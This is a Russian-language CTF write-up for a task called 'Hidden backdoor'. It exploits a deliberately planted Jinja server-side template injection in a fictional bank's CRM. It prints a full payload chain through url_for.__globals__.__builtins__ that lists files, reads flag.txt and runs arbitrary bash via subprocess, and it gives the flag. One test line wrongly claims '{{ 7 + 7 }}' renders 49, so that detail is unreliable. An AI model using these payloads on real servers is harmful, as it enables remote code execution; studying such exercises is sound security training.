# Hidden backdoor: Write-up

Решив таск __Сервер исходных кодов__, мы нашли GitLab Банка. Видим там ещё один репозиторий — CRM.

Недолго думая, понимаем, что он наверное как-то связан с уже найденным `crm.bankbank.tech`, который мы взломали немного ранее в таске __Проникновение__.

Внимательно изучаем репозиторий и обнаруживаем забавную функцию для показа страницы после авторизации:

```python
f = open("templates/crm.html", "r", encoding="utf8").read().replace(">>>FDATA<<<", request.args.get("fdata", ""))

return render_template_string(f)
```

Это очень известная уязвимость — **SSTI** (Server Side Template Injection). А, поскольку очевидно, что это сделано не случайно, можем заключить, что это и есть искомый бекдор. Значит, необходимо идти и **ломать**.

## А вообще, что не так?

Давайте в `fdata` передадим `{{ 7 + 7 }}`. Увидим на странице `49`: значит, фактически, с помощью Jinja Templates можно исполнять код.

## Процесс

Сам синтаксис шаблонов и функция для рендеринга немного ограничивают нас в действиях, поскольку из Jinja доступно не так много функций.

Однако, в шаблоне есть функция `url_for`, и, поскольку хоть какая-нибудь валидация отсутствует, пойдем с неё.

0. `url_for` → функция
1. `url_for.__globals__` → словарь globals, видим где-то `__import__`
   * `url_for.__globals__.__import__` не работает: если отформатировать JSON, то станет видно
2. `url_for.__globals__.__builtins__` → словарь с ключом `__import__`
3. `url_for.__globals__.__builtins__.__import__` → функция, позволяющая инлайново импортировать модули
4. `url_for.__globals__.__builtins__.__import__('os')` → модуль `os`
5. `url_for.__globals__.__builtins__.__import__('os').listdir` → функция `listdir`
6. `url_for.__globals__.__builtins__.__import__('os').listdir()` → список файлов

Вау, `flag.txt`!

7. `url_for.__globals__.__builtins__.open` → функция `open`
8. `url_for.__globals__.__builtins__.open('flag.txt')` → файловый дескриптор
9. `url_for.__globals__.__builtins__.open('flag.txt').read()` → флаг

Можно пойти и дальше:

10. `url_for.__globals__.__builtins__.__import__('subprocess').run(['/bin/bash', '-c', 'whatever you want'], stdout=-1).stdout`

Шелл, который в рамках таска нам нужен не был.

Флаг: **uctf_we_should_go_deeper**
